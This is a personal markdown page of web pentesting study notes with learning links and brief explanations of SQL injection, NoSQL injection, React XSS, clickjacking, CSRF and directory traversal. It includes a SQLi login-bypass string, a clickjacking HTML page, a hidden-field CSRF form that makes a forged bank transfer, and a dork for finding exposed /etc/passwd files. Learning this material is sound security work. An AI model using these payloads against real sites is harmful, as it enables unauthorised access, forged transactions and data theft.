# Pentesting

## Useful Links

[G's bughunter university](https://sites.google.com/site/bughunteruniversity/nonvuln)  
[Bug Bounty Forum](https://bugbountyforum.com/)  
[Cibrary](https://www.cybrary.it/)  
[HackerOne - Resources for new hackers](https://www.hackerone.com/blog/resources-for-new-hackers)  
[HackerOne - Hacker101](https://www.hackerone.com/hacker101)  
[Damn Vulnerable Web Application - DVWA](http://www.dvwa.co.uk/)  
[Hacksplaining - Security training for developers](https://www.hacksplaining.com/)  
[Varonis - Web Security Fundamentals](https://info.varonis.com/web-security-fundamentals)  
[Hacker101.com - Free web class for web security](https://www.hacker101.com)  
[READ THIS BOOK](https://leanpub.com/web-hacking-101)  

## Stuff

#### Very Basic SQLi

1. App accepts a form for username and password and runs SQL in some form.
1. Enter "password" as password, obv fails.
1. Enter "password`". If app crashes, it may be vulnerable.
1. Enter ' or 1=1--' as password. The "--" flag tells SQL to ignore the rest of the statement.

Further explanation: https://www.hacksplaining.com/prevention/sql-injection  
Code samples: https://www.hacksplaining.com/prevention/sql-injection#code-samples  

#### NoSQL Injection

[OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)  
[Blind](https://www.dailysecurity.fr/nosql-injections-classique-blind/)  

#### React Apps 

[Medium - Exploiting Script Injection Flaws in ReactJS Apps](https://medium.com/dailyjs/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1)  
[Medium - The Most Common XSS Vulnerability in React.js Applications](https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0)  

> By default, React DOM escapes any values embedded in JSX before rendering them. Thus it ensures that you can never inject anything that’s not explicitly written in your application. Everything is converted to a string before being rendered. This helps prevent XSS (cross-site-scripting) attacks.

> By setting a content security policy in the response header, you can tell the browser to never execute inline JavaScript, and to lock down which domains can host JavaScript for a page:

```
Content-Security-Policy: script-src 'self' https://apis.google.com
```

#### Clickjacking

An attacker iframes a webpage in a similar domain in order to trick the user.  
Basically, the iframe has a transparent div on top that will redirect to whatever place the attacker wants.

Code snippet:

```html
<html>
  <head>
    <style>
      body {
        position: relative;
        margin: 0;
      }

      iframe, div, a {
        border: none;
        position: absolute;
        width: 100%;
        height: 100%;
      }

      div {
        z-index: 100;
      }

      a {
        display: block;
      }
    </style>
  </head>
  <body>
    <iframe src="www.kittens.com/vacuum-revenge">
    </iframe>
    <div>
      <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.buttholebalm.com&p[title]=Itchy"></a>
    </div>
  </body>
</html>
```

#### CRSF Cross-Site Request Forgery

Imagine a site that accept posts from users via a GET request. Bob posts "I love burgers", so the request would look like:

```
GET http://examplecrappysite.com/post?text="I%20love%20burgers"
```

Now imagine Alice knows this, and knows Bob's email. She sends and email to him with the following text:

```
Look at this kitty fighting the vacuum cleaner in the CUTEST way! bit.ly/MALICIOUS_LINK 
```

YES. Malicious link is, indeed, malicious; and covers the following URL:

```
http://examplecrappysite.com/post?text="Look+at+this+kitty+fighting+the+vacuum+cleaner+in+the+CUTEST+way%21+bit.ly%2FMALICIOUS_LINK"
```

If Bob is logged in EXAMPLECRAPPYSITE, clicking the link will trigger a new post on his behalf:

```
Bob says: Look at this kitty fighting the vacuum cleaner in the CUTEST way! bit.ly/MALICIOUS_LINK 
```

If other users keep clicking that link, they will also trigger the action and the post will keep spreading.

_This can also be triggered in POST requests:_

[OWASP - CRSF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)):  

> Applications can be developed to only accept POST requests for the execution of business logic. The misconception is that since the attacker cannot construct a malicious link, a CSRF attack cannot be executed. Unfortunately, this logic is incorrect. There are numerous methods in which an attacker can trick a victim into submitting a forged POST request, such as a simple form hosted in an attacker's Website with hidden values. This form can be triggered automatically by JavaScript or can be triggered by the victim who thinks the form will do something else.

Imagine a banking site named BANKING. BANKING uses (as almost everyone) post requests to commit actions on behalf of their users. An example of a transaction form would look like this:

```html
<form action="http://api.banking.com/transaction" method="post">
    Quantity: <input type="text"></br>
    To Account: <input type="text"></br>
</form>
```

This form accepts a quantity to transfer to another account. So far so good.

Now, there's a new site called WHENWILLIDIE that accepts your name and your age and outputs your death date (SPOOKY). The form where users input their data looks like this:

```html
<form action="http://api.banking.com/transaction" method="post">
    Your name: <input type="text"><br>
    Your age: <input type="text"><br>
    <input type="submit">
    <input type="hidden" name="quantity" value="1000">
    <input type="hidden" name="toaccount" value="12345678">
</form>
```

When the user inputs their name and age, the site will secretly submit a from to api.banking.com to create a new transaction request, to account 12345678 for an ammount of 1000 (of whatever currency). If the user is still logged in after their last session, the request will go through.

#### Directory Traversal

[Hacker Noon - The Power of Directory Traversal](https://hackernoon.com/the-power-of-directory-traversal-93e8dfd608ef)  
[OWASP - Path Traversal](https://www.owasp.org/index.php/Path_Traversal)  

>A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).
This attack is also known as “dot-dot-slash”, “directory traversal”, “directory climbing” and “backtracking”.

Dork:

```
inurl:../etc/passwd -intext:etc root:x
```